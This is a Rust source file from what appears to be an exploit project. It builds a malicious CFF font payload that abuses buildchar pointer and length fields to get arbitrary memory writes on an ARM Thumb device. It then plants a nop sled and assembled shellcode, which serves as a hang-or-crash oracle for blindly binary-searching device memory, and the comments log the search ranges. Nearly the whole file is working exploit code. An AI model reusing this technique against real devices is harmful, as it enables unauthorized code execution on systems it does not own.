use capstone::{arch, Capstone};
use capstone::arch::BuildsCapstone;
use crate::payload::{CffPayloadBuilder, Payload};
use crate::payload::exploit_config::ExploitConfig;

#[derive(Default)]
pub struct BinarySearchPayload {}

impl Payload for BinarySearchPayload {
    fn build_cff<Cfg: ExploitConfig>(&self, b: &mut CffPayloadBuilder) {
        // Lets make sure we have lots of space
        // Not fully needed but should help with blind reliability
        b.index_write(Cfg::OFFSET_BUILDCHAR_LEN_PTR, i32::MAX as u32);

        // Set our write target to start of ram
        b.index_write(Cfg::OFFSET_BUILDCHAR_PTR, 0x0800_0000_u32);


        let mut tmp = Vec::new();
        // 0x10 no hang
        // 0x100 hang

        // Nop sled
        for _ in 0..0x100 {
            tmp.extend_from_slice(&[0xc0, 0x46, 0xc0, 0x46] /* nop nop*/);
        }

        // Shellcode
        {
            use keystone_engine::Keystone;
            let engine =
                Keystone::new(Arch::ARM, Mode::THUMB).expect("Could not initialize Keystone engine");

            // 1000-2000 (Hang)
            // 1500-2000 (Crash)
            // 1000-1500 (Hang)
            // 1300-1500 (Hang)
            // 1400-1500 (crash)
            // 1300-1410 (hang)
            // 1350-1400 (crash)

            // 1350-1410 (crash)
            // 1300-1354 (hang)
            // 1320-1354 (hang)
            // 1330-1354 (crash)
            // 1320-1334 (hang)
            // 132C-1334 (crash)
            // 1320-132c (hang)
            // 1320-1328 (hang)
            // 1320-1324 (hang) so its at 0x0800_1320
            const CODE: &'static str = r#"
push {r1,r2,r3,r4}

ldr r1, =0x08001320
ldr r3, =0x6c707041
ldr r4, =0x08001324

_loop:
ldr r2, [r1]
subs r2, r2, r3
beq hang
adds r1, #4
subs r2, r4, r1
beq crash
b _loop

hang:
b hang

crash:
pop {r1,r2,r3,r4}
bx lr
            "#;

            let result = engine
                .asm(CODE.to_string(), 0)
                .expect("Could not assemble");


            tmp.extend_from_slice(&result.bytes);

            for (i, x) in tmp.chunks(4).enumerate() {
                println!("{:08x} {:02x?}", 0x0800_0000 + i, x);
            }

            println!("----");

            for (i, x) in result.bytes.chunks(4).enumerate() {
                println!("{:08x} {:02x?}", 0x0800_0000 + 0x400 + i * 4, x);
            }

            {
                let cs = Capstone::new()
                    .arm()
                    .mode(arch::arm::ArchMode::Thumb)
                    .detail(true)
                    .build()
                    .expect("Failed to create Capstone object");

                let insns = cs.disasm_all(&result.bytes, 0x1000)
                    .expect("Failed to disassemble");

                for i in insns.as_ref() {
                    println!("{}", i);
                }
            }
        }


        for (idx, t) in tmp.chunks(4).enumerate() {
            let mut tmp = [0u8, 0, 0, 0];
            tmp[..t.len()].copy_from_slice(t);

            b.index_write_array(idx as u16, tmp);
        }
    }
}